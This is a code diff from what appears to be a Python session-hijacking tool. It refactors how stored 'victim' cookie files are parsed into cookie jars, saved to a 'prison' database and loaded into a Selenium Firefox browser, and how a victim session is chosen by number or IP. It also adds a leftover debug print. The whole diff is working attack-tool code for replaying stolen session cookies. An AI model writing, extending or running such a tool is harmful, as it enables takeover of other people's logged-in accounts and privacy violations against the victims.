@@ -20,7 +20,7 @@ def load_selection_screen(sessions, victim):
     os.system("cls")
     sessions_available = [number for (number, _) in victim.items()]
     print(f"[i] {sessions} sessions detected.")
-    print(f"Sessions available: {sessions_available}")
+    print(f"[i] Sessions available: {sessions_available}")
     question = f"Which one to load? (s to skip): "
     selection = input(question)
     while not verify_selection(selection, sessions_available):
@@ -48,6 +48,28 @@ def load_cookies(victim, driver: webdriver.Firefox):
     print("[+] Cookies loaded successfully")
 
 
+def populate_cookies(cookies):
+    cookie_list = []
+    for (_, cookiejar) in cookies.items():
+        for cookie in cookiejar:
+            cookie_list.append(Cookie(
+                cookie["name"], cookie["value"], cookie["domain"]))
+    return cookie_list
+
+
+def populate_victim(cookie_files, directory, victim):
+    victim_obj = Victim(victim)
+    for cookie_file in cookie_files:
+        if "cookies" in cookie_file:
+            session_number = cookie_file[7:-5]
+            with open(f"{directory}/{victim}/{cookie_file}") as f:
+                cookies = json.load(f)
+            cookie_list = populate_cookies(cookies)
+            cookie_jar = CookieJar(cookie_list)
+            victim_obj.update_cookies(cookie_jar, session_number)
+    return victim_obj
+
+
 def get_cookies(prison, directory="data"):
     if not os.path.exists(directory):
         print(
@@ -56,27 +78,16 @@ def get_cookies(prison, directory="data"):
         return False
     _, victims, _ = next(os.walk(directory))
     for victim in victims:
-        victim_obj = Victim(victim)
         _, _, cookie_files = next(os.walk(f"{directory}/{victim}"))
-        for cookie_file in cookie_files:
-            if "cookies" in cookie_file:
-                session_number = cookie_file[7:-5]
-                with open(f"{directory}/{victim}/{cookie_file}") as f:
-                    cookies = json.load(f)
-                cookie_list = []
-                for (_, cookiejar) in cookies.items():
-                    for cookie in cookiejar:
-                        cookie_list.append(Cookie(
-                            cookie["name"], cookie["value"], cookie["domain"]))
-                cookie_jar = CookieJar(cookie_list)
-                victim_obj.update_cookies(cookie_jar, session_number)
-                prison.add_victim(victim_obj)
+        victim_obj = populate_victim(cookie_files, directory, victim)
+        prison.add_victim(victim_obj)
     prison._save_db()
     print("[+] Database updated successfully...")
     return True
 
 
 def is_ip(selection):
+    print(selection, "here")
     try:
         socket.gethostbyname(selection)
         return True
@@ -93,16 +104,9 @@ def is_int(number):
 
 
 def victim_verify(victims, selection):
-    if selection == "s":
-        return True
-    elif is_int(selection):
-        if selection in victims:
-            return victims[selection]
-    elif is_ip(selection):
-        for _, ip in victims.items():
-            if ip == selection:
-                return ip
-
+    for (index, ip) in victims.items():
+        if selection in [index, ip]:
+            return ip
     return False
 
 
